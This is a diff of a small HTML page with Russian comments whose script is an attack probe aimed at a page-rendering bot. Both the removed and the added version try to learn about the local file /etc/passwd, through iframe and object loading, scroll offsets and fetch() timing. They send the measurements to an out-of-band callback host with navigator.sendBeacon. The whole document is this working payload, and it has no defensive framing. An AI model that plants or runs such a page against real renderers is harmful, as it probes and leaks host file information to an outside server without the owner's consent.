@@ -1,51 +1,25 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
-
-        function send(path, info) {
-            navigator.sendBeacon(`${hook}/${path}`, info);
-        }
-
-        // 1. Сигнал старта
-        send("START_PROBE", "Bot_Active");
-
-        // 2. Метод через проверку видимости (Intersection Observer)
-        // Если контент в iframe загрузился, это может вызвать событие отрисовки
-        const ifr = document.createElement('iframe');
-        ifr.style.width = "100px";
-        ifr.style.height = "100px";
+   <script>
+    const hook = "https://esqbwjbyepcxrsacleqf2vy5xwjs1cvp1.oast.fun";
+    
+    async function leakStep() {
+        // Мерим разницу между реальным файлом и мусором
+        const p1 = "file:///etc/passwd";
+        const p2 = "file:///etc/non_existent_file_999";
         
-        // Замеряем время до события onload
-        const start = performance.now();
-        ifr.onload = () => {
-            const duration = performance.now() - start;
-            send("LOAD_SUCCESS", `Time: ${duration}ms`);
-            
-            // Пытаемся узнать количество строк через "слепой" скролл
-            try {
-                ifr.contentWindow.scrollTo(0, 99999);
-                const pos = ifr.contentWindow.pageYOffset;
-                send("SCROLL_DATA", `Y: ${pos}`);
-            } catch(e) {
-                send("SOP_BLOCK", "Cannot_Read_Internal_Scroll");
-            }
-        };
+        const t1 = await performance.now();
+        try { await fetch(p1, {mode:'no-cors'}); } catch(e){}
+        const d1 = performance.now() - t1;
 
-        ifr.onerror = () => send("LOAD_ERROR", "Access_Denied");
-        ifr.src = "file:///etc/passwd";
-        document.body.appendChild(ifr);
+        const t2 = await performance.now();
+        try { await fetch(p2, {mode:'no-cors'}); } catch(e){}
+        const d2 = performance.now() - t2;
 
-        // 3. Трюк с "объектом" (Object tag)
-        // Он часто дает больше инфы о размере контента
-        const obj = document.createElement('object');
-        obj.data = "file:///etc/passwd";
-        obj.onload = () => {
-            send("OBJECT_LOADED", `W:${obj.offsetWidth} H:${obj.offsetHeight}`);
-        };
-        document.body.appendChild(obj);
-
-    </script>
+        navigator.sendBeacon(hook + "/FINAL_TIME_PROOF", `Passwd: ${d1}ms | Fake: ${d2}ms`);
+    }
+    leakStep();
+</script>
 </body>
 </html>
